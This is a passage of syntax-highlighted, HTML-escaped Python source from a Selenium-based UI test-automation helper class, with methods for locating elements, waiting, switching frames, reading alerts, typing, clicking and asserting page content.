&lt;/span&gt;&lt;span&gt; 45&lt;/span&gt; &lt;span&gt;        :param by: eg: id, name, xpath, css.....
&lt;/span&gt;&lt;span&gt; 46&lt;/span&gt; &lt;span&gt;        :param locator: id, name, xpath for str
&lt;/span&gt;&lt;span&gt; 47&lt;/span&gt; &lt;span&gt;        :return: element object
&lt;/span&gt;&lt;span&gt; 48&lt;/span&gt;         &lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;
&lt;span&gt; 49&lt;/span&gt;         &lt;span&gt;try&lt;/span&gt;&lt;span&gt;:
&lt;/span&gt;&lt;span&gt; 50&lt;/span&gt;             &lt;span&gt;print&lt;/span&gt;(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;[Info:Starting find the element &quot;{}&quot; by &quot;{}&quot;!]&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;.format(locator, by))
&lt;/span&gt;&lt;span&gt; 51&lt;/span&gt;             element = wd(self.driver, self.outTime).until(&lt;span&gt;lambda&lt;/span&gt;&lt;span&gt; x : x.find_element(by, locator))
&lt;/span&gt;&lt;span&gt; 52&lt;/span&gt;         &lt;span&gt;except&lt;/span&gt;&lt;span&gt; TimeoutException as t:
&lt;/span&gt;&lt;span&gt; 53&lt;/span&gt;             &lt;span&gt;print&lt;/span&gt;(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;error: found &quot;{}&quot; timeout!&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;.format(locator), t)
&lt;/span&gt;&lt;span&gt; 54&lt;/span&gt;         &lt;span&gt;except&lt;/span&gt;&lt;span&gt; NoSuchWindowException as e:
&lt;/span&gt;&lt;span&gt; 55&lt;/span&gt;             &lt;span&gt;print&lt;/span&gt;(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;error: no such &quot;{}&quot;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;.format(locator), e)
&lt;/span&gt;&lt;span&gt; 56&lt;/span&gt;         &lt;span&gt;except&lt;/span&gt;&lt;span&gt; Exception as e:
&lt;/span&gt;&lt;span&gt; 57&lt;/span&gt;             &lt;span&gt;raise&lt;/span&gt;&lt;span&gt; e
&lt;/span&gt;&lt;span&gt; 58&lt;/span&gt;         &lt;span&gt;else&lt;/span&gt;&lt;span&gt;:
&lt;/span&gt;&lt;span&gt; 59&lt;/span&gt;             &lt;span&gt;#&lt;/span&gt;&lt;span&gt; print('[Info:Had found the element &quot;{}&quot; by &quot;{}&quot;!]'.format(locator, by))&lt;/span&gt;
&lt;span&gt; 60&lt;/span&gt;             &lt;span&gt;return&lt;/span&gt;&lt;span&gt; element
&lt;/span&gt;&lt;span&gt; 61&lt;/span&gt; 
&lt;span&gt; 62&lt;/span&gt;     &lt;span&gt;def&lt;/span&gt;&lt;span&gt; findElements(self, by, locator):
&lt;/span&gt;&lt;span&gt; 63&lt;/span&gt;         &lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;
&lt;span&gt; 64&lt;/span&gt; &lt;span&gt;        find group elements
&lt;/span&gt;&lt;span&gt; 65&lt;/span&gt; &lt;span&gt;        :param by: eg: id, name, xpath, css.....
&lt;/span&gt;&lt;span&gt; 66&lt;/span&gt; &lt;span&gt;        :param locator: eg: id, name, xpath for str
&lt;/span&gt;&lt;span&gt; 67&lt;/span&gt; &lt;span&gt;        :return: elements object
&lt;/span&gt;&lt;span&gt; 68&lt;/span&gt;         &lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;
&lt;span&gt; 69&lt;/span&gt;         &lt;span&gt;try&lt;/span&gt;&lt;span&gt;:
&lt;/span&gt;&lt;span&gt; 70&lt;/span&gt;             &lt;span&gt;print&lt;/span&gt;(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;[Info:start find the elements &quot;{}&quot; by &quot;{}&quot;!]&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;.format(locator, by))
&lt;/span&gt;&lt;span&gt; 71&lt;/span&gt;             elements = wd(self.driver, self.outTime).until(&lt;span&gt;lambda&lt;/span&gt;&lt;span&gt; x : x.find_element(by, locator))
&lt;/span&gt;&lt;span&gt; 72&lt;/span&gt;         &lt;span&gt;except&lt;/span&gt;&lt;span&gt; TimeoutException as t:
&lt;/span&gt;&lt;span&gt; 73&lt;/span&gt;             &lt;span&gt;print&lt;/span&gt;&lt;span&gt;(t)
&lt;/span&gt;&lt;span&gt; 74&lt;/span&gt;         &lt;span&gt;except&lt;/span&gt;&lt;span&gt; NoSuchWindowException as e:
&lt;/span&gt;&lt;span&gt; 75&lt;/span&gt;             &lt;span&gt;print&lt;/span&gt;&lt;span&gt;(e)
&lt;/span&gt;&lt;span&gt; 76&lt;/span&gt;         &lt;span&gt;except&lt;/span&gt;&lt;span&gt; Exception as e:
&lt;/span&gt;&lt;span&gt; 77&lt;/span&gt;             &lt;span&gt;raise&lt;/span&gt;&lt;span&gt; e
&lt;/span&gt;&lt;span&gt; 78&lt;/span&gt;         &lt;span&gt;else&lt;/span&gt;&lt;span&gt;:
&lt;/span&gt;&lt;span&gt; 79&lt;/span&gt;             &lt;span&gt;#&lt;/span&gt;&lt;span&gt; print('[Info:Had found the elements &quot;{}&quot; by &quot;{}&quot;!]'.format(locator, by))&lt;/span&gt;
&lt;span&gt; 80&lt;/span&gt;             &lt;span&gt;return&lt;/span&gt;&lt;span&gt; elements
&lt;/span&gt;&lt;span&gt; 81&lt;/span&gt; 
&lt;span&gt; 82&lt;/span&gt;     &lt;span&gt;def&lt;/span&gt;&lt;span&gt; isElementExsit(self, by, locator):
&lt;/span&gt;&lt;span&gt; 83&lt;/span&gt;         &lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;
&lt;span&gt; 84&lt;/span&gt; &lt;span&gt;        assert element if exist
&lt;/span&gt;&lt;span&gt; 85&lt;/span&gt; &lt;span&gt;        :param by: eg: id, name, xpath, css.....
&lt;/span&gt;&lt;span&gt; 86&lt;/span&gt; &lt;span&gt;        :param locator: eg: id, name, xpath for str
&lt;/span&gt;&lt;span&gt; 87&lt;/span&gt; &lt;span&gt;        :return: if element return True else return false
&lt;/span&gt;&lt;span&gt; 88&lt;/span&gt;         &lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;
&lt;span&gt; 89&lt;/span&gt;         &lt;span&gt;if&lt;/span&gt; by.lower() &lt;span&gt;in&lt;/span&gt;&lt;span&gt; self.byDic:
&lt;/span&gt;&lt;span&gt; 90&lt;/span&gt;             &lt;span&gt;try&lt;/span&gt;&lt;span&gt;:
&lt;/span&gt;&lt;span&gt; 91&lt;/span&gt; &lt;span&gt;                wd(self.driver, self.outTime).\
&lt;/span&gt;&lt;span&gt; 92&lt;/span&gt; &lt;span&gt;                    until(EC.visibility_of_element_located((self.byDic[by], locator)))
&lt;/span&gt;&lt;span&gt; 93&lt;/span&gt;             &lt;span&gt;except&lt;/span&gt;&lt;span&gt; TimeoutException:
&lt;/span&gt;&lt;span&gt; 94&lt;/span&gt;                 &lt;span&gt;print&lt;/span&gt;(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Error: element &quot;{}&quot; time out!&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;.format(locator))
&lt;/span&gt;&lt;span&gt; 95&lt;/span&gt;                 &lt;span&gt;return&lt;/span&gt;&lt;span&gt; False
&lt;/span&gt;&lt;span&gt; 96&lt;/span&gt;             &lt;span&gt;except&lt;/span&gt;&lt;span&gt; NoSuchWindowException:
&lt;/span&gt;&lt;span&gt; 97&lt;/span&gt;                 &lt;span&gt;print&lt;/span&gt;(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Error: element &quot;{}&quot; not exsit!&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;.format(locator))
&lt;/span&gt;&lt;span&gt; 98&lt;/span&gt;                 &lt;span&gt;return&lt;/span&gt;&lt;span&gt; False
&lt;/span&gt;&lt;span&gt; 99&lt;/span&gt;             &lt;span&gt;return&lt;/span&gt;&lt;span&gt; True
&lt;/span&gt;&lt;span&gt;100&lt;/span&gt;         &lt;span&gt;else&lt;/span&gt;&lt;span&gt;:
&lt;/span&gt;&lt;span&gt;101&lt;/span&gt;             &lt;span&gt;print&lt;/span&gt;(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;the &quot;{}&quot; error!&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;.format(by))
&lt;/span&gt;&lt;span&gt;102&lt;/span&gt; 
&lt;span&gt;103&lt;/span&gt;     &lt;span&gt;def&lt;/span&gt;&lt;span&gt; isClick(self, by, locator):
&lt;/span&gt;&lt;span&gt;104&lt;/span&gt;         &lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span&gt;判断是否可点击,返回元素对象&lt;/span&gt;&lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;
&lt;span&gt;105&lt;/span&gt;         &lt;span&gt;if&lt;/span&gt; by.lower() &lt;span&gt;in&lt;/span&gt;&lt;span&gt; self.byDic:
&lt;/span&gt;&lt;span&gt;106&lt;/span&gt;             &lt;span&gt;try&lt;/span&gt;&lt;span&gt;:
&lt;/span&gt;&lt;span&gt;107&lt;/span&gt;                 element =&lt;span&gt; wd(self.driver, self.outTime).\
&lt;/span&gt;&lt;span&gt;108&lt;/span&gt; &lt;span&gt;                    until(EC.element_to_be_clickable((self.byDic[by], locator)))
&lt;/span&gt;&lt;span&gt;109&lt;/span&gt;             &lt;span&gt;except&lt;/span&gt;&lt;span&gt; Exception:
&lt;/span&gt;&lt;span&gt;110&lt;/span&gt;                 &lt;span&gt;return&lt;/span&gt;&lt;span&gt; False
&lt;/span&gt;&lt;span&gt;111&lt;/span&gt;             &lt;span&gt;return&lt;/span&gt;&lt;span&gt; element
&lt;/span&gt;&lt;span&gt;112&lt;/span&gt;         &lt;span&gt;else&lt;/span&gt;&lt;span&gt;:
&lt;/span&gt;&lt;span&gt;113&lt;/span&gt;             &lt;span&gt;print&lt;/span&gt;(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;the &quot;{}&quot; error!&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;.format(by))
&lt;/span&gt;&lt;span&gt;114&lt;/span&gt; 
&lt;span&gt;115&lt;/span&gt;     &lt;span&gt;def&lt;/span&gt;&lt;span&gt; isAlertAndSwitchToIt(self):
&lt;/span&gt;&lt;span&gt;116&lt;/span&gt;         &lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;
&lt;span&gt;117&lt;/span&gt; &lt;span&gt;        assert alert if exsit
&lt;/span&gt;&lt;span&gt;118&lt;/span&gt; &lt;span&gt;        :return: alert obj
&lt;/span&gt;&lt;span&gt;119&lt;/span&gt;         &lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;
&lt;span&gt;120&lt;/span&gt;         &lt;span&gt;try&lt;/span&gt;&lt;span&gt;:
&lt;/span&gt;&lt;span&gt;121&lt;/span&gt;             re =&lt;span&gt; wd(self.driver, self.outTime).until(EC.alert_is_present())
&lt;/span&gt;&lt;span&gt;122&lt;/span&gt;         &lt;span&gt;except&lt;/span&gt;&lt;span&gt; NoAlertPresentException:
&lt;/span&gt;&lt;span&gt;123&lt;/span&gt;             &lt;span&gt;return&lt;/span&gt;&lt;span&gt; False
&lt;/span&gt;&lt;span&gt;124&lt;/span&gt;         &lt;span&gt;except&lt;/span&gt;&lt;span&gt; Exception:
&lt;/span&gt;&lt;span&gt;125&lt;/span&gt;             &lt;span&gt;return&lt;/span&gt;&lt;span&gt; False
&lt;/span&gt;&lt;span&gt;126&lt;/span&gt;         &lt;span&gt;return&lt;/span&gt;&lt;span&gt; re
&lt;/span&gt;&lt;span&gt;127&lt;/span&gt; 
&lt;span&gt;128&lt;/span&gt;     &lt;span&gt;def&lt;/span&gt;&lt;span&gt; switchToFrame(self, by, locator):
&lt;/span&gt;&lt;span&gt;129&lt;/span&gt;         &lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span&gt;判断frame是否存在，存在就跳到frame&lt;/span&gt;&lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;
&lt;span&gt;130&lt;/span&gt;         &lt;span&gt;print&lt;/span&gt;(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;info:switching to iframe &quot;{}&quot;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;.format(locator))
&lt;/span&gt;&lt;span&gt;131&lt;/span&gt;         &lt;span&gt;if&lt;/span&gt; by.lower() &lt;span&gt;in&lt;/span&gt;&lt;span&gt; self.byDic:
&lt;/span&gt;&lt;span&gt;132&lt;/span&gt;             &lt;span&gt;try&lt;/span&gt;&lt;span&gt;:
&lt;/span&gt;&lt;span&gt;133&lt;/span&gt; &lt;span&gt;                wd(self.driver, self.outTime).\
&lt;/span&gt;&lt;span&gt;134&lt;/span&gt; &lt;span&gt;                    until(EC.frame_to_be_available_and_switch_to_it((self.byDic[by], locator)))
&lt;/span&gt;&lt;span&gt;135&lt;/span&gt;             &lt;span&gt;except&lt;/span&gt;&lt;span&gt; TimeoutException as t:
&lt;/span&gt;&lt;span&gt;136&lt;/span&gt;                 &lt;span&gt;print&lt;/span&gt;(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;error: found &quot;{}&quot; timeout！&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;.format(locator), t)
&lt;/span&gt;&lt;span&gt;137&lt;/span&gt;             &lt;span&gt;except&lt;/span&gt;&lt;span&gt; NoSuchFrameException as e:
&lt;/span&gt;&lt;span&gt;138&lt;/span&gt;                 &lt;span&gt;print&lt;/span&gt;(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;error: no such &quot;{}&quot;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;.format(locator), e)
&lt;/span&gt;&lt;span&gt;139&lt;/span&gt;             &lt;span&gt;except&lt;/span&gt;&lt;span&gt; Exception as e:
&lt;/span&gt;&lt;span&gt;140&lt;/span&gt;                 &lt;span&gt;raise&lt;/span&gt;&lt;span&gt; e
&lt;/span&gt;&lt;span&gt;141&lt;/span&gt;         &lt;span&gt;else&lt;/span&gt;&lt;span&gt;:
&lt;/span&gt;&lt;span&gt;142&lt;/span&gt;             &lt;span&gt;print&lt;/span&gt;(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;the &quot;{}&quot; error!&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;.format(by))
&lt;/span&gt;&lt;span&gt;143&lt;/span&gt; 
&lt;span&gt;144&lt;/span&gt;     &lt;span&gt;def&lt;/span&gt;&lt;span&gt; switchToDefaultFrame(self):
&lt;/span&gt;&lt;span&gt;145&lt;/span&gt;         &lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span&gt;返回默认的frame&lt;/span&gt;&lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;
&lt;span&gt;146&lt;/span&gt;         &lt;span&gt;print&lt;/span&gt;(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;info:switch back to default iframe&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;147&lt;/span&gt;         &lt;span&gt;try&lt;/span&gt;&lt;span&gt;:
&lt;/span&gt;&lt;span&gt;148&lt;/span&gt; &lt;span&gt;            self.driver.switch_to.default_content()
&lt;/span&gt;&lt;span&gt;149&lt;/span&gt;         &lt;span&gt;except&lt;/span&gt;&lt;span&gt; Exception as e:
&lt;/span&gt;&lt;span&gt;150&lt;/span&gt;             &lt;span&gt;print&lt;/span&gt;&lt;span&gt;(e)
&lt;/span&gt;&lt;span&gt;151&lt;/span&gt; 
&lt;span&gt;152&lt;/span&gt;     &lt;span&gt;def&lt;/span&gt;&lt;span&gt; getAlertText(self):
&lt;/span&gt;&lt;span&gt;153&lt;/span&gt;         &lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span&gt;获取alert的提示信息&lt;/span&gt;&lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;
&lt;span&gt;154&lt;/span&gt;         &lt;span&gt;if&lt;/span&gt;&lt;span&gt; self.isAlertAndSwitchToIt():
&lt;/span&gt;&lt;span&gt;155&lt;/span&gt;             alert =&lt;span&gt; self.isAlertAndSwitchToIt()
&lt;/span&gt;&lt;span&gt;156&lt;/span&gt;             &lt;span&gt;return&lt;/span&gt;&lt;span&gt; alert.text
&lt;/span&gt;&lt;span&gt;157&lt;/span&gt;         &lt;span&gt;else&lt;/span&gt;&lt;span&gt;:
&lt;/span&gt;&lt;span&gt;158&lt;/span&gt;             &lt;span&gt;return&lt;/span&gt;&lt;span&gt; None
&lt;/span&gt;&lt;span&gt;159&lt;/span&gt; 
&lt;span&gt;160&lt;/span&gt;     &lt;span&gt;def&lt;/span&gt; getElementText(self, by, locator, name=&lt;span&gt;None):
&lt;/span&gt;&lt;span&gt;161&lt;/span&gt;         &lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span&gt;获取某一个元素的text信息&lt;/span&gt;&lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;
&lt;span&gt;162&lt;/span&gt;         &lt;span&gt;try&lt;/span&gt;&lt;span&gt;:
&lt;/span&gt;&lt;span&gt;163&lt;/span&gt;             element =&lt;span&gt; self.findElement(by, locator)
&lt;/span&gt;&lt;span&gt;164&lt;/span&gt;             &lt;span&gt;if&lt;/span&gt;&lt;span&gt; name:
&lt;/span&gt;&lt;span&gt;165&lt;/span&gt;                 &lt;span&gt;return&lt;/span&gt;&lt;span&gt; element.get_attribute(name)
&lt;/span&gt;&lt;span&gt;166&lt;/span&gt;             &lt;span&gt;else&lt;/span&gt;&lt;span&gt;:
&lt;/span&gt;&lt;span&gt;167&lt;/span&gt;                 &lt;span&gt;return&lt;/span&gt;&lt;span&gt; element.text
&lt;/span&gt;&lt;span&gt;168&lt;/span&gt;         &lt;span&gt;except&lt;/span&gt;&lt;span&gt;:
&lt;/span&gt;&lt;span&gt;169&lt;/span&gt;             &lt;span&gt;print&lt;/span&gt;(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;get &quot;{}&quot; text failed return None&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;.format(locator))
&lt;/span&gt;&lt;span&gt;170&lt;/span&gt;             &lt;span&gt;return&lt;/span&gt;&lt;span&gt; None
&lt;/span&gt;&lt;span&gt;171&lt;/span&gt; 
&lt;span&gt;172&lt;/span&gt;     &lt;span&gt;def&lt;/span&gt;&lt;span&gt; loadUrl(self, url):
&lt;/span&gt;&lt;span&gt;173&lt;/span&gt;         &lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span&gt;加载url&lt;/span&gt;&lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;
&lt;span&gt;174&lt;/span&gt;         &lt;span&gt;print&lt;/span&gt;(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;info: string upload url &quot;{}&quot;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;.format(url))
&lt;/span&gt;&lt;span&gt;175&lt;/span&gt; &lt;span&gt;        self.driver.get(url)
&lt;/span&gt;&lt;span&gt;176&lt;/span&gt; 
&lt;span&gt;177&lt;/span&gt;     &lt;span&gt;def&lt;/span&gt;&lt;span&gt; getSource(self):
&lt;/span&gt;&lt;span&gt;178&lt;/span&gt;         &lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span&gt;获取页面源码&lt;/span&gt;&lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;
&lt;span&gt;179&lt;/span&gt;         &lt;span&gt;return&lt;/span&gt;&lt;span&gt; self.driver.page_source
&lt;/span&gt;&lt;span&gt;180&lt;/span&gt; 
&lt;span&gt;181&lt;/span&gt;     &lt;span&gt;def&lt;/span&gt; sendKeys(self, by, locator, value=&lt;span&gt;''&lt;/span&gt;&lt;span&gt;):
&lt;/span&gt;&lt;span&gt;182&lt;/span&gt;         &lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span&gt;写数据&lt;/span&gt;&lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;
&lt;span&gt;183&lt;/span&gt;         &lt;span&gt;print&lt;/span&gt;(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;info:input &quot;{}&quot;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;.format(value))
&lt;/span&gt;&lt;span&gt;184&lt;/span&gt;         &lt;span&gt;try&lt;/span&gt;&lt;span&gt;:
&lt;/span&gt;&lt;span&gt;185&lt;/span&gt;             element =&lt;span&gt; self.findElement(by, locator)
&lt;/span&gt;&lt;span&gt;186&lt;/span&gt; &lt;span&gt;            element.send_keys(value)
&lt;/span&gt;&lt;span&gt;187&lt;/span&gt;         &lt;span&gt;except&lt;/span&gt;&lt;span&gt; AttributeError as e:
&lt;/span&gt;&lt;span&gt;188&lt;/span&gt;             &lt;span&gt;print&lt;/span&gt;&lt;span&gt;(e)
&lt;/span&gt;&lt;span&gt;189&lt;/span&gt; 
&lt;span&gt;190&lt;/span&gt;     &lt;span&gt;def&lt;/span&gt;&lt;span&gt; clear(self, by, locator):
&lt;/span&gt;&lt;span&gt;191&lt;/span&gt;         &lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span&gt;清理数据&lt;/span&gt;&lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;
&lt;span&gt;192&lt;/span&gt;         &lt;span&gt;print&lt;/span&gt;(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;info:clearing value&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;193&lt;/span&gt;         &lt;span&gt;try&lt;/span&gt;&lt;span&gt;:
&lt;/span&gt;&lt;span&gt;194&lt;/span&gt;             element =&lt;span&gt; self.findElement(by, locator)
&lt;/span&gt;&lt;span&gt;195&lt;/span&gt; &lt;span&gt;            element.clear()
&lt;/span&gt;&lt;span&gt;196&lt;/span&gt;         &lt;span&gt;except&lt;/span&gt;&lt;span&gt; AttributeError as e:
&lt;/span&gt;&lt;span&gt;197&lt;/span&gt;             &lt;span&gt;print&lt;/span&gt;&lt;span&gt;(e)
&lt;/span&gt;&lt;span&gt;198&lt;/span&gt; 
&lt;span&gt;199&lt;/span&gt;     &lt;span&gt;def&lt;/span&gt;&lt;span&gt; click(self, by, locator):
&lt;/span&gt;&lt;span&gt;200&lt;/span&gt;         &lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span&gt;点击某个元素&lt;/span&gt;&lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;
&lt;span&gt;201&lt;/span&gt;         &lt;span&gt;print&lt;/span&gt;(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;info:click &quot;{}&quot;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;.format(locator))
&lt;/span&gt;&lt;span&gt;202&lt;/span&gt;         element =&lt;span&gt; self.isClick(by, locator)
&lt;/span&gt;&lt;span&gt;203&lt;/span&gt;         &lt;span&gt;if&lt;/span&gt;&lt;span&gt; element:
&lt;/span&gt;&lt;span&gt;204&lt;/span&gt; &lt;span&gt;            element.click()
&lt;/span&gt;&lt;span&gt;205&lt;/span&gt;         &lt;span&gt;else&lt;/span&gt;&lt;span&gt;:
&lt;/span&gt;&lt;span&gt;206&lt;/span&gt;             &lt;span&gt;print&lt;/span&gt;(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;the &quot;{}&quot; unclickable!&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;207&lt;/span&gt; 
&lt;span&gt;208&lt;/span&gt;     &lt;span&gt;def&lt;/span&gt; sleep(self, num=&lt;span&gt;0):
&lt;/span&gt;&lt;span&gt;209&lt;/span&gt;         &lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span&gt;强制等待&lt;/span&gt;&lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;
&lt;span&gt;210&lt;/span&gt;         &lt;span&gt;print&lt;/span&gt;(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;info:sleep &quot;{}&quot; minutes&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;.format(num))
&lt;/span&gt;&lt;span&gt;211&lt;/span&gt; &lt;span&gt;        time.sleep(num)
&lt;/span&gt;&lt;span&gt;212&lt;/span&gt; 
&lt;span&gt;213&lt;/span&gt;     &lt;span&gt;def&lt;/span&gt;&lt;span&gt; ctrlV(self, value):
&lt;/span&gt;&lt;span&gt;214&lt;/span&gt;         &lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span&gt;ctrl + V 粘贴&lt;/span&gt;&lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;
&lt;span&gt;215&lt;/span&gt;         &lt;span&gt;print&lt;/span&gt;(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;info:pasting &quot;{}&quot;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;.format(value))
&lt;/span&gt;&lt;span&gt;216&lt;/span&gt; &lt;span&gt;        ClipBoard.setText(value)
&lt;/span&gt;&lt;span&gt;217&lt;/span&gt;         self.sleep(3&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;218&lt;/span&gt;         KeyBoard.twoKeys(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;ctrl&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;v&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;219&lt;/span&gt; 
&lt;span&gt;220&lt;/span&gt;     &lt;span&gt;def&lt;/span&gt;&lt;span&gt; enterKey(self):
&lt;/span&gt;&lt;span&gt;221&lt;/span&gt;         &lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span&gt;enter 回车键&lt;/span&gt;&lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;
&lt;span&gt;222&lt;/span&gt;         &lt;span&gt;print&lt;/span&gt;(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;info:keydown enter&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;223&lt;/span&gt;         KeyBoard.oneKey(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;enter&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;224&lt;/span&gt; 
&lt;span&gt;225&lt;/span&gt;     &lt;span&gt;def&lt;/span&gt;&lt;span&gt; waitElementtobelocated(self, by, locator):
&lt;/span&gt;&lt;span&gt;226&lt;/span&gt;         &lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span&gt;显示等待某个元素出现，且可见&lt;/span&gt;&lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;
&lt;span&gt;227&lt;/span&gt;         &lt;span&gt;print&lt;/span&gt;(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;info:waiting &quot;{}&quot; to be located&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;.format(locator))
&lt;/span&gt;&lt;span&gt;228&lt;/span&gt;         &lt;span&gt;try&lt;/span&gt;&lt;span&gt;:
&lt;/span&gt;&lt;span&gt;229&lt;/span&gt; &lt;span&gt;            wd(self.driver, self.outTime).until(EC.visibility_of_element_located((self.byDic[by], locator)))
&lt;/span&gt;&lt;span&gt;230&lt;/span&gt;         &lt;span&gt;except&lt;/span&gt;&lt;span&gt; TimeoutException as t:
&lt;/span&gt;&lt;span&gt;231&lt;/span&gt;             &lt;span&gt;print&lt;/span&gt;(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;error: found &quot;{}&quot; timeout！&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;.format(locator), t)
&lt;/span&gt;&lt;span&gt;232&lt;/span&gt;         &lt;span&gt;except&lt;/span&gt;&lt;span&gt; NoSuchWindowException as e:
&lt;/span&gt;&lt;span&gt;233&lt;/span&gt;             &lt;span&gt;print&lt;/span&gt;(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;error: no such &quot;{}&quot;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;.format(locator), e)
&lt;/span&gt;&lt;span&gt;234&lt;/span&gt;         &lt;span&gt;except&lt;/span&gt;&lt;span&gt; Exception as e:
&lt;/span&gt;&lt;span&gt;235&lt;/span&gt;             &lt;span&gt;raise&lt;/span&gt;&lt;span&gt; e
&lt;/span&gt;&lt;span&gt;236&lt;/span&gt; 
&lt;span&gt;237&lt;/span&gt;     &lt;span&gt;def&lt;/span&gt;&lt;span&gt; assertValueInSource(self, value):
&lt;/span&gt;&lt;span&gt;238&lt;/span&gt;         &lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span&gt;断言某个关键字是否存在页面源码中&lt;/span&gt;&lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;
&lt;span&gt;239&lt;/span&gt;         &lt;span&gt;print&lt;/span&gt;(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;info:assert &quot;{}&quot; in page source&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;.format(value))
&lt;/span&gt;&lt;span&gt;240&lt;/span&gt;         source =&lt;span&gt; self.getSource()
